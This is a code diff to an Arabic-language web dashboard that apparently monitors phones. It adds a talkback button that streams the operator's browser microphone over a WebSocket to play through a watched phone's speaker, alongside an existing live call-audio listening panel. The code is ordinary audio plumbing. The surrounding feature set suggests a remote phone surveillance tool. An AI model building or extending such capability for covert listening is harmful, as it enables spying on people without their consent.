@@ -433,7 +433,7 @@
                 <!-- Live Call Audio Stream ("سمع الصوت") -->
                 <div class="info-section" style="background: rgba(15, 52, 96, 0.45); border: 1px solid rgba(56, 189, 248, 0.4); box-shadow: 0 4px 12px rgba(0,0,0,0.3);">
                     <div class="section-title" style="color: #38bdf8; font-weight: 800;">
-                        <span>🎙️ المكالمة والصوت المباشر (Call Audio)</span>
+                        <span>🎙️ المكالمة والصوت المباشر (Two-Way Call Audio)</span>
                     </div>
                     <div style="display: flex; flex-direction: column; gap: 0.7rem; margin-top: 0.4rem;">
                         <button id="btnToggleAudio" onclick="toggleCallAudio()" style="background: linear-gradient(135deg, #10b981, #059669); color: white; border: none; padding: 0.75rem; border-radius: 8px; font-weight: 700; font-size: 0.95rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; transition: all 0.2s ease;">
@@ -446,6 +446,14 @@
                         <!-- Audio Visualizer Level Bar -->
                         <div style="width: 100%; height: 8px; background: rgba(0,0,0,0.4); border-radius: 4px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05);">
                             <div id="audioActivityBar" style="width: 0%; height: 100%; background: linear-gradient(to right, #10b981, #38bdf8); transition: width 0.08s ease;"></div>
+                        </div>
+
+                        <!-- Talkback Mic Button ("التحدث إلى الهاتف") -->
+                        <button id="btnToggleTalk" onclick="toggleTalk()" style="background: linear-gradient(135deg, #3b82f6, #2563eb); color: white; border: none; padding: 0.75rem; border-radius: 8px; font-weight: 700; font-size: 0.95rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; transition: all 0.2s ease;">
+                            <span id="talkIcon">🎤</span> <span id="talkBtnText">التحدث إلى الهاتف (فتح المايك)</span>
+                        </button>
+                        <div id="talkStatusText" style="font-size: 0.8rem; color: #94a3b8; display: flex; align-items: center; gap: 0.4rem;">
+                            <span>المايك مقفل — اضغط للتحدث ليسمعك من الهاتف</span>
                         </div>
                     </div>
                 </div>
@@ -654,6 +662,104 @@
             }
             source.start(nextAudioStartTime);
             nextAudioStartTime += audioBuffer.duration;
+        }
+
+        // --- Two-Way Intercom: Talk to Device (Browser Mic -> WebSocket 0x03 -> Phone Speaker) ---
+        let isTalking = false;
+        let talkStream = null;
+        let talkAudioContext = null;
+        let talkProcessor = null;
+
+        async function toggleTalk() {
+            const btn = document.getElementById('btnToggleTalk');
+            const icon = document.getElementById('talkIcon');
+            const text = document.getElementById('talkBtnText');
+            const status = document.getElementById('talkStatusText');
+
+            if (!isTalking) {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    alert('المتصفح لا يدعم الوصول للميكروفون أو يتطلب اتصال HTTPS آمن.');
+                    return;
+                }
+
+                try {
+                    talkStream = await navigator.mediaDevices.getUserMedia({
+                        audio: {
+                            channelCount: 1,
+                            sampleRate: 16000,
+                            echoCancellation: true,
+                            noiseSuppression: true,
+                            autoGainControl: true
+                        }
+                    });
+
+                    talkAudioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+                    const source = talkAudioContext.createMediaStreamSource(talkStream);
+                    talkProcessor = talkAudioContext.createScriptProcessor(2048, 1, 1);
+
+                    talkProcessor.onaudioprocess = (e) => {
+                        if (!isTalking || !ws || ws.readyState !== WebSocket.OPEN || !currentWatchedId) return;
+                        const inputData = e.inputBuffer.getChannelData(0);
+                        const pcm16 = new Int16Array(inputData.length);
+                        for (let i = 0; i < inputData.length; i++) {
+                            const s = Math.max(-1, Math.min(1, inputData[i]));
+                            pcm16[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
+                        }
+
+                        // Tag 0x03 = Talkback audio from dashboard to phone speaker
+                        const packet = new Uint8Array(1 + pcm16.buffer.byteLength);
+                        packet[0] = 0x03;
+                        packet.set(new Uint8Array(pcm16.buffer), 1);
+                        ws.send(packet);
+                    };
+
+                    source.connect(talkProcessor);
+                    talkProcessor.connect(talkAudioContext.destination);
+
+                    isTalking = true;
+                    if (btn) {
+                        btn.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
+                        btn.style.boxShadow = '0 0 15px rgba(239, 68, 68, 0.6)';
+                    }
+                    if (icon) icon.textContent = '🔴';
+                    if (text) text.textContent = 'جاري التحدث (اضغط للقفل)';
+                    if (status) status.innerHTML = '<span style="color: #ef4444; font-weight: 700;">● صوتك يخرج الآن من مكبر صوت الهاتف مباشرة!</span>';
+                } catch (err) {
+                    console.error('Microphone access denied:', err);
+                    alert('يرجى السماح بالوصول إلى الميكروفون في المتصفح لتتمكن من التحدث إلى الهاتف.');
+                }
+            } else {
+                stopTalk();
+            }
+        }
+
+        function stopTalk() {
+            isTalking = false;
+            if (talkProcessor) {
+                try { talkProcessor.disconnect(); } catch (_) {}
+                talkProcessor = null;
+            }
+            if (talkAudioContext) {
+                try { talkAudioContext.close(); } catch (_) {}
+                talkAudioContext = null;
+            }
+            if (talkStream) {
+                try { talkStream.getTracks().forEach(t => t.stop()); } catch (_) {}
+                talkStream = null;
+            }
+
+            const btn = document.getElementById('btnToggleTalk');
+            const icon = document.getElementById('talkIcon');
+            const text = document.getElementById('talkBtnText');
+            const status = document.getElementById('talkStatusText');
+
+            if (btn) {
+                btn.style.background = 'linear-gradient(135deg, #3b82f6, #2563eb)';
+                btn.style.boxShadow = 'none';
+            }
+            if (icon) icon.textContent = '🎤';
+            if (text) text.textContent = 'التحدث إلى الهاتف (فتح المايك)';
+            if (status) status.innerHTML = '<span>المايك مقفل — اضغط للتحدث ليسمعك من الهاتف</span>';
         }
 
         function connectWebSocket() {
@@ -901,6 +1007,9 @@
             // Reset audio state
             if (isAudioListening) {
                 toggleCallAudio();
+            }
+            if (isTalking) {
+                stopTalk();
             }
             const bar = document.getElementById('audioActivityBar');
             if (bar) bar.style.width = '0%';
